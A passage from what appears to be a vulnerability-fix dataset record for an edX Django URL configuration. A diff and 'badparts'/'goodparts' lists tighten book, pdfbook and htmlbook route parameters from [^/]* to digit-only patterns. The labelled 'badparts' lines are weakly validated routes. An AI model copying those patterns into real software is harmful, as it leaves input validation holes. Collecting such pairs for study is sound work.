'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n", "message": "", "files": {"/lms/urls.py": {"changes": [{"diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n", "add": 8, "remove": 8, "filename": "/lms/urls.py", "badparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',"], "goodparts": ["        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',", "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"]}], "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ", "sourceWithComments": "from django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account', name='create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# 